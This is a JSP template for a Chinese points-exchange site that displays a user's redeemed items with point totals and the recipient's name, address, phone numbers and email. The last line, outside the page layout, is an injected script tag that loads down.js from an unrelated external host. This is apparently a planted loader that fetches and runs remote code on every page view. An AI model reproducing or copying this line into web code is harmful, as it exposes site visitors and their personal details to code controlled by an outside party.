<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-兑换明细"/> 
<%@ include file="IncludeTop.jsp" %>

<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td background="images/left_border.gif" width="10"></td>
    <td width="198" height="129" valign="top">
		<%@ include file="searchProductBar.jsp" %>
		<%@ include file="searchAllBar.jsp" %>
		<%@ include file="newsBar.jsp" %>
	</td>
    <td bgcolor="#FFFFFF" valign="top" width="562"> 
        <table width="100%" border="1" cellpadding="1" cellspacing="0" bordercolor="#CCCCCC">
          <tr> 
            <td> 
              <div align="center"></div>
            </td>
            <td>您的兑换清单</td>
            <td>&nbsp;
				
            </td>
          </tr>
          <tr> 
            <td width="35%"> 
              <div align="center">商品名称</div>
            </td>
            <td width="15%"> 
              <div align="center">积点数</div>
            </td>
            <td width="15%"> 
              <div align="center">数量</div>
            </td>
          </tr>
          <c:set var="exchange" value="${result.exchange}"/>
		  <c:forEach var="item" items="${exchange.changeList}" > 
          <tr> 
            <td width="35%"><c:out value="${item.name}"/></td>
            <td width="15%"><c:out value="${item.point}"/></td>
            <td width="15%"><c:out value="${item.count}"/></td>
          </tr>
          </c:forEach>
          <tr> 
            <td width="35%">合计</td>
            <td width="15%"><c:out value="${exchange.totalPoint}"/></td>
            <td width="15%"><c:out value="${exchange.totalCount}"/></td>
          </tr>
     </table>
		
      <table width="100%" border="1">
        <tr> 
          <td colspan="2"> 
            <p>收货人联系方式：</p>
          </td>
        </tr>
        <tr> 
          <td width="16%">姓名：</td>
          <td width="73%"> <c:out value="${exchange.name}"/> </td>
        </tr>
        <tr> 
          <td width="16%"> 地址：</td>
          <td width="73%"> <c:out value="${exchange.address}"/> </td>
        </tr>
        <tr> 
          <td width="16%">邮编：</td>
          <td width="73%"> <c:out value="${exchange.zip}"/> </td>
        </tr>
        <tr> 
          <td width="16%">联系电话：</td>
          <td width="73%"> <c:out value="${exchange.telNo}"/> </td>
        </tr>
        <tr> 
          <td width="16%">手机：</td>
          <td width="73%"> <c:out value="${exchange.mobile}"/> </td>
        </tr>
        <tr> 
          <td width="16%">Email:</td>
          <td width="73%"> <c:out value="${exchange.email}"/> </td>
        </tr>
      </table>
    <td width="10" bgcolor="#FFFFFF" valign="top" background="images/right_border.gif">&nbsp;</td>
  </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>